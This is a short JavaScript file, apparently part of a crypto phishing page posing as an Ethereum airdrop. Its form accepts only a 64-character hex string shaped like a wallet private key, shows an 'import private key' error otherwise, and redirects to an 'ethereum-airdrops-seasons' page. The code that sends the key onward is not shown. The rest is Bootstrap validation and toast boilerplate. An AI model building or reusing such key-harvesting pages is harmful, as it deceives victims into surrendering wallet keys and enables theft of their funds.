document.getElementById('myForm').addEventListener('submit', function(event) {
  var inputField = document.getElementById('inputField').value;
  var errorMessage = document.getElementById('error-message');
  
  // Validasi panjang tepat 64 karakter
  if (inputField.length !== 64) {
      errorMessage.textContent = "Something went wrong! We couldnt imported your private key.";
      event.preventDefault();
      return;
  }
  
  // Validasi hanya huruf kecil dan angka tanpa spasi
  var regex = /^[a-z0-9]{64}$/;
  if (!regex.test(inputField)) {
      errorMessage.textContent = "Something went wrong! We couldnt imported your private key.";
      event.preventDefault();
      return;
  }

  const toastTrigger = document.getElementById('liveToastBtn')
  const toastLiveExample = document.getElementById('liveToast')
  
  if (toastTrigger) {
    const toastBootstrap = bootstrap.Toast.getOrCreateInstance(toastLiveExample)
    toastTrigger.addEventListener('click', () => {
      toastBootstrap.show()
    })
  }
    
  errorMessage.textContent = "";
});

function redirectToSecondPage() {
  // Go to Nex Page
  window.location.href = "ethereum-airdrops-seasons.html";
}

// Ambil elemen gambar
const gif = document.getElementById('gif');

// Simpan src awal untuk di-load kembali
const originalSrc = gif.src;

// Saat gambar selesai dimuat, ubah src untuk berhenti setelah satu kali putar
gif.onload = function() {
    gif.src = originalSrc; // Kembalikan src ke aslinya agar hanya diputar sekali
};

// Example starter JavaScript for disabling form submissions if there are invalid fields
(() => {
  'use strict'

  // Fetch all the forms we want to apply custom Bootstrap validation styles to
  const forms = document.querySelectorAll('.needs-validation')

  // Loop over them and prevent submission
  Array.from(forms).forEach(form => {
    form.addEventListener('submit', event => {
      if (!form.checkValidity()) {
        event.preventDefault()
        event.stopPropagation()
      }

      form.classList.add('was-validated')
    }, false)
  })
})()
const myToastEl = document.getElementById('myToast')
myToastEl.addEventListener('hidden.bs.toast', () => {
  // do something...
})